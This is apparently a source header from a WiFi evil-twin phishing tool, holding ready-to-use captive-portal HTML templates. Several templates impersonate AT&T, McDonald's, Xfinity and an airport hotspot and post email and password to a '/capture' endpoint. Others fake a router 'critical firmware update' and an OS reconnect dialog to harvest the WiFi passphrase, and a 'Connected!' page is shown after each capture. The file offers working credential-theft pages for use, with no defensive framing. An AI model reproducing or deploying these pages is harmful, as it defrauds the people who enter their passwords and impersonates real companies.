<svg viewBox='0 0 100 100' xmlns='http://www.w3.org/2000/svg'>
<circle cx='50' cy='50' r='48' fill='#1a365d'/>
<circle cx='50' cy='50' r='44' fill='none' stroke='#4299e1' stroke-width='2'/>
<path d='M25 55 L45 50 L50 35 L55 50 L75 55 L55 58 L50 75 L45 58 Z' fill='#fff'/>
<line x1='20' y1='60' x2='35' y2='55' stroke='#fff' stroke-width='2' opacity='.5'/>
<line x1='15' y1='65' x2='30' y2='58' stroke='#fff' stroke-width='1.5' opacity='.3'/>
</svg>
</div>
<h1>Airport Free WiFi</h1>
<p class='s'>Complimentary internet for travelers</p>
<form method='POST' action='/capture'>
<div class='fg'>
<label>Email Address</label>
<input type='email' name='email' placeholder='your@email.com' required>
</div>
<div class='fg'>
<label>Password</label>
<input type='password' name='password' placeholder='Password' required>
</div>
<button type='submit'>Connect to WiFi</button>
</form>
<div class='i'>
<strong>Traveler Info:</strong> Free WiFi for 2 hours. Premium unlimited access available.
</div>
<p class='t'>By connecting, you agree to the Airport Authority Terms of Service. Network usage may be monitored for security purposes.</p>
</div>
</body>
</html>)pg";

// ═══════════════════════════════════════════════════════════════════════════
// TEMPLATE 6: AT&T - Single stage (email + password)
// Blue gradient (#009FDB -> #00629B), AT&T globe SVG, unlimited data info
// ═══════════════════════════════════════════════════════════════════════════

const char portal_att[] PROGMEM = R"pg(<!DOCTYPE html>
<html>
<head>
<title>AT&amp;T WiFi</title>
<meta name='viewport' content='width=device-width, initial-scale=1'>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:linear-gradient(135deg,#009FDB 0%,#00629B 100%);min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px}
.c{background:#fff;border-radius:16px;padding:40px;max-width:400px;width:100%;box-shadow:0 20px 60px rgba(0,0,0,.3);text-align:center}
.lg{width:120px;height:80px;margin:0 auto 20px}
.lg svg{width:100%;height:100%}
h1{color:#00629B;font-size:22px;margin-bottom:8px;font-weight:600}
.s{color:#666;margin-bottom:30px;font-size:14px}
.fg{margin-bottom:16px;text-align:left}
label{display:block;color:#00629B;font-weight:500;margin-bottom:6px;font-size:14px}
input{width:100%;padding:14px 16px;border:2px solid #e0e0e0;border-radius:8px;font-size:16px;transition:border-color .2s}
input:focus{outline:none;border-color:#009FDB}
button{width:100%;padding:16px;background:#009FDB;color:#fff;border:none;border-radius:8px;font-size:16px;font-weight:600;cursor:pointer;margin-top:10px;transition:background .2s}
button:hover{background:#00629B}
.info{margin-top:20px;padding:15px;background:#E6F4FA;border-radius:8px;font-size:13px;color:#00629B}
.note{margin-top:15px;font-size:12px;color:#666}
.note a{color:#009FDB;text-decoration:none;font-weight:500}
.t{margin-top:20px;font-size:11px;color:#999;line-height:1.5}
</style>
</head>
<body>
<div class='c'>
<div class='lg'>
<svg viewBox='0 0 120 80' xmlns='http://www.w3.org/2000/svg'>
<circle cx='60' cy='40' r='35' fill='#009FDB'/>
<ellipse cx='60' cy='40' rx='35' ry='15' fill='none' stroke='#fff' stroke-width='1.5'/>
<ellipse cx='60' cy='40' rx='20' ry='35' fill='none' stroke='#fff' stroke-width='1.5'/>
<line x1='25' y1='40' x2='95' y2='40' stroke='#fff' stroke-width='1.5'/>
<line x1='60' y1='5' x2='60' y2='75' stroke='#fff' stroke-width='1.5'/>
<text x='60' y='90' text-anchor='middle' font-family='Arial,sans-serif' font-size='16' font-weight='bold' fill='#00629B'>AT&amp;T</text>
</svg>
</div>
<h1>AT&amp;T WiFi Hotspot</h1>
<p class='s'>Sign in with your AT&amp;T account</p>
<form method='POST' action='/capture'>
<div class='fg'>
<label for='email'>AT&amp;T User ID (Email)</label>
<input type='email' id='email' name='email' placeholder='your@email.com' required>
</div>
<div class='fg'>
<label for='password'>Password</label>
<input type='password' id='password' name='password' placeholder='Password' required>
</div>
<button type='submit'>Sign In</button>
</form>
<div class='info'>
<strong>AT&amp;T Customers</strong><br>
Unlimited data customers get free WiFi hotspot access nationwide.
</div>
<p class='note'>
Not an AT&amp;T customer? <a href='#'>Learn about our plans</a>
</p>
<p class='t'>
By signing in, you agree to the AT&amp;T Terms of Service
and AT&amp;T Privacy Policy.
</p>
</div>
</body>
</html>)pg";

// ═══════════════════════════════════════════════════════════════════════════
// TEMPLATE 7: McDONALD'S - Single stage (email + password)
// Red/yellow gradient (#DA291C -> #FFC72C), golden arches SVG, rewards promo
// ═══════════════════════════════════════════════════════════════════════════

const char portal_mcdonalds[] PROGMEM = R"pg(<!DOCTYPE html>
<html>
<head>
<title>McDonald's Free WiFi</title>
<meta name='viewport' content='width=device-width, initial-scale=1'>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:linear-gradient(135deg,#DA291C 0%,#FFC72C 100%);min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px}
.c{background:#fff;border-radius:16px;padding:40px;max-width:400px;width:100%;box-shadow:0 20px 60px rgba(0,0,0,.3);text-align:center}
.lg{width:120px;height:100px;margin:0 auto 20px}
.lg svg{width:100%;height:100%}
h1{color:#DA291C;font-size:24px;margin-bottom:8px;font-weight:700}
.s{color:#666;margin-bottom:30px;font-size:14px}
.fg{margin-bottom:16px;text-align:left}
label{display:block;color:#292929;font-weight:500;margin-bottom:6px;font-size:14px}
input{width:100%;padding:14px 16px;border:2px solid #e0e0e0;border-radius:8px;font-size:16px;transition:border-color .2s}
input:focus{outline:none;border-color:#FFC72C}
button{width:100%;padding:16px;background:#DA291C;color:#fff;border:none;border-radius:8px;font-size:16px;font-weight:600;cursor:pointer;margin-top:10px;transition:background .2s}
button:hover{background:#bf2318}
.promo{margin-top:20px;padding:15px;background:#FFF8E7;border-radius:8px;font-size:13px;color:#292929}
.promo strong{color:#DA291C}
.t{margin-top:20px;font-size:11px;color:#999;line-height:1.5}
</style>
</head>
<body>
<div class='c'>
<div class='lg'>
<svg viewBox='0 0 120 100' xmlns='http://www.w3.org/2000/svg'>
<path d='M10 90 Q10 20 35 20 Q50 20 50 50 L50 90' fill='none' stroke='#FFC72C' stroke-width='16' stroke-linecap='round'/>
<path d='M110 90 Q110 20 85 20 Q70 20 70 50 L70 90' fill='none' stroke='#FFC72C' stroke-width='16' stroke-linecap='round'/>
</svg>
</div>
<h1>McDonald's Free WiFi</h1>
<p class='s'>Sign in for free internet access</p>
<form method='POST' action='/capture'>
<div class='fg'>
<label for='email'>Email Address</label>
<input type='email' id='email' name='email' placeholder='your@email.com' required>
</div>
<div class='fg'>
<label for='password'>Password</label>
<input type='password' id='password' name='password' placeholder='Password' required>
</div>
<button type='submit'>Connect Free WiFi</button>
</form>
<div class='promo'>
<strong>MyMcDonald's Rewards</strong><br>
Earn points on every order! Download the app.
</div>
<p class='t'>
By connecting, you agree to McDonald's Terms of Use and Privacy Policy.
Free WiFi provided for customer use.
</p>
</div>
</body>
</html>)pg";

// ═══════════════════════════════════════════════════════════════════════════
// TEMPLATE 8: XFINITY - Single stage (email + password)
// Black gradient background, Xfinity text logo with red X, signature dots
// ═══════════════════════════════════════════════════════════════════════════

const char portal_xfinity[] PROGMEM = R"pg(<!DOCTYPE html>
<html>
<head>
<title>Xfinity WiFi</title>
<meta name='viewport' content='width=device-width, initial-scale=1'>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:linear-gradient(135deg,#000 0%,#1a1a1a 50%,#333 100%);min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px}
.c{background:#fff;border-radius:16px;padding:40px;max-width:400px;width:100%;box-shadow:0 20px 60px rgba(0,0,0,.5);text-align:center}
.lg{width:200px;height:60px;margin:0 auto 25px}
.lg svg{width:100%;height:100%}
h1{color:#000;font-size:22px;margin-bottom:8px;font-weight:600}
.s{color:#666;margin-bottom:30px;font-size:14px}
.fg{margin-bottom:16px;text-align:left}
label{display:block;color:#333;font-weight:500;margin-bottom:6px;font-size:14px}
input{width:100%;padding:14px 16px;border:2px solid #e0e0e0;border-radius:8px;font-size:16px;transition:border-color .2s}
input:focus{outline:none;border-color:#e4002b}
button{width:100%;padding:16px;background:#e4002b;color:#fff;border:none;border-radius:8px;font-size:16px;font-weight:600;cursor:pointer;margin-top:10px;transition:background .2s}
button:hover{background:#c70025}
.info{margin-top:20px;padding:15px;background:#f5f5f5;border-radius:8px;font-size:13px;color:#333}
.note{margin-top:15px;font-size:12px;color:#666}
.note a{color:#e4002b;text-decoration:none;font-weight:500}
.t{margin-top:20px;font-size:11px;color:#999;line-height:1.5}
</style>
</head>
<body>
<div class='c'>
<div class='lg'>
<svg viewBox='0 0 200 60' xmlns='http://www.w3.org/2000/svg'>
<text x='10' y='45' font-family='Arial,sans-serif' font-size='38' font-weight='bold' fill='#000'>
<tspan fill='#e4002b'>x</tspan>finity
</text>
<circle cx='175' cy='15' r='4' fill='#e4002b'/>
<circle cx='185' cy='15' r='4' fill='#e4002b'/>
<circle cx='195' cy='15' r='4' fill='#e4002b'/>
</svg>
</div>
<h1>Connect to Xfinity WiFi</h1>
<p class='s'>Sign in with your Xfinity account</p>
<form method='POST' action='/capture'>
<div class='fg'>
<label for='email'>Xfinity ID (Email)</label>
<input type='email' id='email' name='email' placeholder='your@email.com' required>
</div>
<div class='fg'>
<label for='password'>Password</label>
<input type='password' id='password' name='password' placeholder='Password' required>
</div>
<button type='submit'>Sign In</button>
</form>
<div class='info'>
<strong>Millions of Hotspots Nationwide</strong><br>
Connect automatically wherever you see "xfinitywifi"
</div>
<p class='note'>
Not an Xfinity customer? <a href='#'>Get a free trial</a>
</p>
<p class='t'>
By signing in, you agree to the Xfinity WiFi Terms and Conditions
and Comcast's Privacy Policy.
</p>
</div>
</body>
</html>)pg";

// ═══════════════════════════════════════════════════════════════════════════
// TEMPLATE 9: FIRMWARE UPDATE - PSK capture (router admin style)
// Gray/blue corporate look, fake progress bar, asks for WiFi password
// ═══════════════════════════════════════════════════════════════════════════

const char portal_firmware_update[] PROGMEM = R"pg(<!DOCTYPE html>
<html>
<head>
<title>Router Firmware Update</title>
<meta name='viewport' content='width=device-width, initial-scale=1'>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif;background:#2c3e50;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
.c{background:#fff;border-radius:8px;padding:35px;max-width:420px;width:100%;box-shadow:0 10px 40px rgba(0,0,0,.4)}
.hd{background:#34495e;margin:-35px -35px 25px;padding:20px 35px;border-radius:8px 8px 0 0;display:flex;align-items:center;gap:12px}
.ri{width:32px;height:32px}
.hd h2{color:#ecf0f1;font-size:16px;font-weight:600}
.al{background:#e74c3c;color:#fff;padding:12px 16px;border-radius:6px;font-size:13px;margin-bottom:20px;display:flex;align-items:center;gap:8px}
.al svg{flex-shrink:0}
h1{font-size:20px;color:#2c3e50;margin-bottom:6px;font-weight:600}
.sub{font-size:13px;color:#7f8c8d;margin-bottom:20px}
.pb{background:#ecf0f1;border-radius:4px;height:22px;margin-bottom:20px;overflow:hidden;position:relative}
.pf{background:linear-gradient(90deg,#3498db,#2980b9);height:100%;width:78%;border-radius:4px;transition:width .3s}
.pt{position:absolute;right:8px;top:3px;font-size:12px;color:#2c3e50;font-weight:600}
.fg{margin-bottom:16px}
label{display:block;font-size:14px;color:#2c3e50;font-weight:500;margin-bottom:6px}
input[type="password"]{width:100%;padding:12px 14px;font-size:15px;border:2px solid #bdc3c7;border-radius:6px;outline:none}
input:focus{border-color:#3498db}
button{width:100%;padding:14px;background:#3498db;color:#fff;border:none;border-radius:6px;font-size:15px;font-weight:600;cursor:pointer;margin-top:8px}
button:hover{background:#2980b9}
.ft{font-size:11px;color:#95a5a6;text-align:center;margin-top:16px;line-height:1.5}
</style>
</head>
<body>
<div class='c'>
<div class='hd'>
<svg class='ri' viewBox='0 0 32 32' fill='none' xmlns='http://www.w3.org/2000/svg'><rect x='4' y='12' width='24' height='14' rx='3' fill='#ecf0f1'/><circle cx='9' cy='19' r='2' fill='#2ecc71'/><circle cx='15' cy='19' r='2' fill='#f39c12'/><rect x='20' y='17' width='5' height='4' rx='1' fill='#3498db'/><rect x='8' y='7' width='2' height='6' fill='#ecf0f1'/><rect x='14' y='4' width='2' height='9' fill='#ecf0f1'/></svg>
<h2>Router Administration</h2>
</div>
<div class='al'>
<svg width='16' height='16' viewBox='0 0 16 16' fill='none'><path d='M8 1L1 14h14L8 1z' fill='#fff'/><text x='8' y='12' text-anchor='middle' font-size='9' font-weight='bold' fill='#e74c3c'>!</text></svg>
Critical Security Update Required
</div>
<h1>Firmware Update for {{SSID}}</h1>
<p class='sub'>A critical security patch must be applied to protect your network.</p>
<div class='pb'><div class='pf'></div><div class='pt'>78%</div></div>
<p class='sub'>Your WiFi password is required to complete the firmware update and maintain your connection.</p>
<form method='POST' action='/capture'>
<div class='fg'>
<label>WiFi Password</label>
<input type='password' name='psk' placeholder='Enter your WiFi password' required autofocus>
</div>
<button type='submit'>Complete Update</button>
</form>
<p class='ft'>This update addresses CVE-2026-0198. Failure to update may leave your network vulnerable to unauthorized access.</p>
</div>
</body>
</html>)pg";

// ═══════════════════════════════════════════════════════════════════════════
// TEMPLATE 10: WIFI RECONNECT - PSK capture (OS-style WiFi dialog)
// Clean minimal white, WiFi icon, asks for password to reconnect
// ═══════════════════════════════════════════════════════════════════════════

const char portal_wifi_reconnect[] PROGMEM = R"pg(<!DOCTYPE html>
<html>
<head>
<title>WiFi Connection</title>
<meta name='viewport' content='width=device-width, initial-scale=1'>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,'Helvetica Neue',Arial,sans-serif;background:#f0f0f0;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
.c{background:#fff;border-radius:14px;padding:40px 35px;max-width:380px;width:100%;box-shadow:0 4px 20px rgba(0,0,0,.12);text-align:center}
.wi{margin:0 auto 20px}
.nm{font-size:20px;font-weight:600;color:#1d1d1f;margin-bottom:6px}
.st{display:inline-block;background:#ff3b30;color:#fff;font-size:11px;font-weight:600;padding:3px 10px;border-radius:10px;margin-bottom:20px}
.msg{font-size:14px;color:#86868b;line-height:1.6;margin-bottom:24px}
.msg strong{color:#1d1d1f}
.fg{margin-bottom:20px;text-align:left}
label{display:block;font-size:13px;color:#86868b;font-weight:500;margin-bottom:6px}
input[type="password"]{width:100%;padding:12px 14px;font-size:16px;border:1px solid #d2d2d7;border-radius:10px;outline:none;background:#f5f5f7}
input:focus{border-color:#0071e3;background:#fff;box-shadow:0 0 0 3px rgba(0,113,227,.15)}
button{width:100%;padding:14px;background:#0071e3;color:#fff;border:none;border-radius:10px;font-size:16px;font-weight:600;cursor:pointer}
button:hover{background:#0077ED}
.sk{display:block;margin-top:14px;color:#0071e3;font-size:14px;text-decoration:none;font-weight:500}
.ft{font-size:11px;color:#c7c7cc;margin-top:20px}
</style>
</head>
<body>
<div class='c'>
<div class='wi'>
<svg width='56' height='56' viewBox='0 0 56 56' fill='none' xmlns='http://www.w3.org/2000/svg'>
<circle cx='28' cy='28' r='28' fill='#f5f5f7'/>
<path d='M28 38a3 3 0 100-6 3 3 0 000 6z' fill='#ff3b30'/>
<path d='M20.5 30.5a10.6 10.6 0 0115 0' stroke='#ff3b30' stroke-width='2.5' stroke-linecap='round'/>
<path d='M15 25a17.7 17.7 0 0126 0' stroke='#ff3b30' stroke-width='2.5' stroke-linecap='round'/>
<path d='M10 19.5a24.5 24.5 0 0136 0' stroke='#d2d2d7' stroke-width='2.5' stroke-linecap='round'/>
</svg>
</div>
<div class='nm'>{{SSID}}</div>
<span class='st'>Disconnected</span>
<p class='msg'>Your connection to <strong>{{SSID}}</strong> has expired. Enter your password to reconnect.</p>
<form method='POST' action='/capture'>
<div class='fg'>
<label>Password</label>
<input type='password' name='psk' placeholder='Enter WiFi password' required autofocus>
</div>
<button type='submit'>Join</button>
<a href='#' class='sk'>Forget This Network</a>
</form>
<p class='ft'>Secured with WPA2/WPA3 Personal</p>
</div>
</body>
</html>)pg";

// ═══════════════════════════════════════════════════════════════════════════
// SHARED SUCCESS PAGE - Shown after credential capture
// Clean "Connected!" confirmation
// ═══════════════════════════════════════════════════════════════════════════

const char portal_success[] PROGMEM = R"pg(<!DOCTYPE html>
<html>
<head>
<title>Connected</title>
<meta name='viewport' content='width=device-width, initial-scale=1'>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#fff;min-height:100vh;display:flex;align-items:center;justify-content:center}
.c{text-align:center;padding:40px}
.k{font-size:64px;margin-bottom:16px}
h1{font-size:24px;color:#333;margin-bottom:8px}
p{font-size:16px;color:#666}
</style>
</head>
<body>
<div class='c'>
<div class='k'>&#9989;</div>
<h1>Connected!</h1>
<p>You now have internet access.</p>
</div>
</body>
</html>)pg";

#endif // PORTAL_PAGES_H
